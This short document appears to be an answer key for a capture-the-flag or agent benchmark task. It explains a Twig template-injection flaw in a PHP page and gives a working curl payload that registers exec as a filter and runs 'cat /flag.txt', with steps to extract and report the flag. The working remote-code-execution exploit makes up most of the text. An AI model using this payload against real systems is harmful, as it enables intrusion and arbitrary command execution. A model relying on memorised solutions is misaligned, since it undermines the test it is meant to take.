# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Twig SSTI via `Twig_Loader_String`. The `name` POST parameter is
only run through `htmlspecialchars()` (which does not encode single quotes) and
then concatenated into a Twig template that is compiled and rendered — giving
template injection → RCE.

1. **POST a Twig RCE payload** that registers `exec` as a filter callback and
   runs `cat /flag.txt`:

   ```
   curl -s -X POST "http://<target>/index.php" \
     --data-urlencode "name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag.txt')}}"
   ```

2. **Extract the flag** (`FLAG{...}`) from the rendered response and report it
   verbatim.
